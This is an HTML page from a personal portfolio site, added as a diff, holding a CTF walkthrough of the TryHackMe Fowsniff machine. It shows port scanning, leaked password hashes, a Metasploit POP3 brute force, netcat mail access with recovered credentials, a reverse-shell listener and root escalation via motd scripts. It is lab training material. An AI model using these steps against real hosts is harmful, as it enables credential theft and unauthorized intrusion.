@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fowsniff — CTF Walkthrough</title>
+    <link rel="stylesheet" href="Writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+</head>
+
+<body>
+
+<div class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>Fowsniff — CTF Walkthrough</h1>
+
+        <p><strong>Context:</strong> Preparing for the Bitdefender CTF regional stage, I worked on the Fowsniff machine.</p>
+
+        <h2>Initial Scan</h2>
+        <p>Fastest Nmap scan possible:</p>
+
+        <pre><code>sudo nmap -sS -sC -sV -Pn -T5 -p- 10.10.159.89</code></pre>
+
+        <p>Open ports found:</p>
+        <ul>
+            <li>22 — SSH</li>
+            <li>80 — HTTP</li>
+            <li>110 — POP3</li>
+            <li>143 — IMAP</li>
+        </ul>
+
+        <h2>Usernames & Passwords</h2>
+        <p>Found online: <a href="https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt" target="_blank">fowsniff.txt</a></p>
+
+        <pre><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+...
+seina@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e</code></pre>
+
+        <p>Decoded the hashes using hashkiller and created <code>user.txt</code> and <code>pass.txt</code>.</p>
+
+        <h2>POP3 Brute Force via Metasploit</h2>
+        <pre><code>msf6 > use auxiliary(scanner/pop3/pop3_login)
+msf6 > set RHOSTS 10.10.159.89
+msf6 > set USER_FILE user.txt
+msf6 > set PASS_FILE pass.txt
+msf6 > run</code></pre>
+
+        <p>Successful login:</p>
+        <pre><code>10.10.159.89:110 - Success: 'seina:scoobydoo2'</code></pre>
+
+        <h2>Accessing Mail</h2>
+        <pre><code>nc 10.10.159.89 110
+user seina
+pass scoobydoo2
+list
+retr 1</code></pre>
+
+        <p>Temporary SSH password retrieved:</p>
+        <pre><code>S1ck3nBluff+secureshell</code></pre>
+
+        <h2>Privilege Escalation</h2>
+        <p>Used the provided reverse shell, uploaded via <code>cube.sh</code> in <code>/opt/cube</code>, and set up a listener:</p>
+
+        <pre><code>nc -lvp 1234</code></pre>
+
+        <p>Connected as <code>baksteen</code>, then followed THM instructions to escalate to root via <code>/etc/update-motd.d</code>. Root shell obtained:</p>
+
+        <pre><code># id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+Maildir
+flag.txt</code></pre>
+
+    </div>
+</section>
+
+</body>
+</html>
